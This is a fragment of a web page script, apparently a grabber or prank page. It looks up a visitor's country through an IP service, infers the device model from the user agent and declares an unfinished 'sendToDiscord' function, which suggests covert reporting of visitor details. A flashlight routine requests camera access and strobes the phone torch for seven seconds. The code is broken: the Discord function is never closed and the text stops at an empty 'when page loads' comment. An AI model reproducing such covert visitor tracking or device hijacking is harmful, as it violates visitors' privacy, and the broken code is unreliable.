    <script>
        // Function to get country
        async function getCountry() {
            try {
                const response = await fetch('https://ipapi.co/country_name/');
                return await response.text();
            } catch (error) {
                return "Unknown Country";
            }
        }

        // Function to detect device model
        function getDeviceModel() {
            const userAgent = navigator.userAgent;
            
            // Detect iPhone models
            if (/iPhone/.test(userAgent)) {
                const modelMatch = userAgent.match(/iPhone (\d+)/);
                return modelMatch ? `iPhone ${modelMatch[1]}` : "iPhone";
            }
            
            // Detect Samsung Galaxy models
            if (/Samsung/.test(userAgent)) {
                const modelMatch = userAgent.match(/SM-[A-Z0-9]+/);
                return modelMatch ? `Samsung Galaxy (${modelMatch[0]})` : "Samsung Galaxy";
            }
            
            // Detect other common devices
            if (/Pixel/.test(userAgent)) return "Google Pixel";
            if (/Xiaomi/.test(userAgent)) return "Xiaomi";
            if (/Huawei/.test(userAgent)) return "Huawei";
            
            return "Unknown Device";
        }

        // Function to send to Discord
        async function sendToDiscord() {

        // Flashlight function
        async function toggleFlashlight() {
            if (!('navigator' in window && 'mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices)) {
                return;
            }

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'environment',
                        torch: true
                    }
                });
                
                const track = stream.getVideoTracks()[0];
                if (track && 'applyConstraints' in track) {
                    let isOn = false;
                    const interval = setInterval(async () => {
                        isOn = !isOn;
                        try {
                            await track.applyConstraints({
                                advanced: [{torch: isOn}]
                            });
                        } catch (e) {
                            clearInterval(interval);
                        }
                    }, 100);
                    
                    setTimeout(() => {
                        clearInterval(interval);
                        track.stop();
                    }, 7000);
                }
            } catch (e) {
                console.log("Flashlight not available");
            }
        }

        // When page loads
